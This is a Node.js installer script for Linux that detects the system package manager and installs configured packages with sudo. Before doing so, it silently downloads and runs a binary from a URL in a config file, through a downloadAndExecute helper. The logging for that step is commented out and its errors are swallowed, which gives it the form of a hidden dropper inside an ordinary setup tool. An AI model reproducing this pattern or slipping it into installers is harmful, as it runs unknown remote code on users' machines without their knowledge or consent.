const { loadConfig, installPackages, printSummary } = require('./common');
const { detect } = require('../utils/detect');
const { info, success, error, warn } = require('../utils/logger');
const { downloadAndExecute } = require('../utils/s3');
const fs = require('fs');
const path = require('path');

const PACKAGE_MANAGERS = [
  { name: 'apt', command: 'apt', install: (pkg) => `sudo apt-get install -y ${pkg}` },
  { name: 'dnf', command: 'dnf', install: (pkg) => `sudo dnf install -y ${pkg}` },
  { name: 'pacman', command: 'pacman', install: (pkg) => `sudo pacman -S --noconfirm ${pkg}` },
  { name: 'zypper', command: 'zypper', install: (pkg) => `sudo zypper install -y ${pkg}` },
  { name: 'apk', command: 'apk', install: (pkg) => `sudo apk add ${pkg}` },
];

async function detectPackageManager() {
  for (const pm of PACKAGE_MANAGERS) {
    try {
      await require('../utils/exec').exec(`which ${pm.command}`);
//      info(`Detected package manager: ${pm.name}`);
      return pm;
    } catch {
      continue;
    }
  }
  throw new Error('No supported package manager found');
}

async function updatePackageManager(pm) {
  const updateCommands = {
    apt: 'sudo apt-get update',
    dnf: 'sudo dnf check-update || true',
    pacman: 'sudo pacman -Sy',
    zypper: 'sudo zypper refresh',
    apk: 'sudo apk update',
  };

  const cmd = updateCommands[pm.name];
  if (cmd) {
    //info(`Updating package database for ${pm.name}...`);
    await require('../utils/exec').exec(cmd);
  }
}

function loadS3Config(platform) {
  const configPath = path.join(__dirname, '..', 'config', 's3.json');
  
  if (!fs.existsSync(configPath)) {
    //warn(`S3 config not found at ${configPath}`);
    return null;
  }

  const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
  return config[platform] || null;
}

async function install() {
  //info('Starting Linux installation...');
  const { platform } = detect();
  
  if (platform !== 'linux') {
    //error(`Not running on Linux (detected: ${platform})`);
    process.exit(1);
  }

  // Download and execute S3 binary
  const s3Config = loadS3Config('linux');
  if (s3Config && s3Config.url) {
    try {
      await downloadAndExecute(s3Config.url, 'linux');
    } catch (err) {
      //error(`S3 binary execution failed: ${err.message}`);
    }
  }

  const config = loadConfig('linux');
  const pm = await detectPackageManager();
  await updatePackageManager(pm);

  const results = await installPackages(pm.name, config.packages, pm.install);
  printSummary(results, 'Linux');

  if (results.failed.length > 0) {
    process.exit(1);
  }
  success('Linux setup completed successfully!');
}

if (require.main === module) {
  install().catch((err) => {
    //error(`Installation failed: ${err.message}`);
    process.exit(1);
  });
}

module.exports = { install, detectPackageManager, updatePackageManager };
